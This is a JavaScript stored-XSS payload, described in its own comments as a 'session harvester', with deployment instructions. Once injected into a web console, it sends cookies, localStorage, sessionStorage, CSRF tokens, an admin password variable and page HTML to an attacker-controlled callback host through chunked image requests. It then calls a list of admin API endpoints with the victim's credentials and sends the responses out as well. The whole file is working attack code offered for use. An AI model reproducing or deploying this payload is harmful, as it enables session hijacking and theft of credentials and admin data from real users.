/* Stored-XSS session harvester.
 * Serve over HTTPS from the SAME host as the /ce callback (mixed content blocks otherwise).
 * Replace __HOOK__ with your hook base (e.g. https://203.0.113.7.sslip.io) and
 * edit urls[] to the console's real API paths (harvest them from its JS bundles). */
(function(){
var B='__HOOK__';
function send(tag,d){try{var s=tag+':'+encodeURIComponent(d||'');for(var i=0;i<s.length;i+=900){(new Image()).src=B+'/ce?XD='+tag+'&i='+Math.floor(i/900)+'&d='+s.slice(i,i+900);}}catch(e){}}
new Image().src=B+'/ce?FIRE=1&u='+encodeURIComponent(location.href)+'&t='+Date.now();
try{send('C',document.cookie||'');}catch(e){}
try{var L={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);L[k]=String(localStorage.getItem(k)).slice(0,3000);}send('L',JSON.stringify(L));}catch(e){}
try{var S={};for(var j=0;j<sessionStorage.length;j++){var k2=sessionStorage.key(j);S[k2]=String(sessionStorage.getItem(k2)).slice(0,3000);}send('S',JSON.stringify(S));}catch(e){}
try{send('U',location.href+' || '+document.title);}catch(e){}
try{send('T','CSRF:'+String(window.CSRF_TOKEN||'none')+' ADA:'+String(window.ADMIN_PASS||''));}catch(e){}
try{send('H',String(document.documentElement.outerHTML||'').slice(0,4000));}catch(e){}
function get(u){return fetch(u,{credentials:'include'}).then(function(r){return r.text().then(function(t){return 'A|'+u+'|'+r.status+'|'+t.slice(0,4000);});}).catch(function(e){return 'A|'+u+'|ERR|'+String(e).slice(0,150);});}
var urls=['/api/session','/api/me','/admin/api/devices','/api/unified/stats','/api/unified/devices','/api/unified/visitors','/api/bot/agents','/api/links','/api/manage/users','/api/manage/settings'];
var res=[];var idx=0;
function nxt(){if(idx>=urls.length){send('AR',JSON.stringify(res).slice(0,60000));return;}var u=urls[idx++];get(u).then(function(x){res.push(x);nxt();});}
nxt();
})();
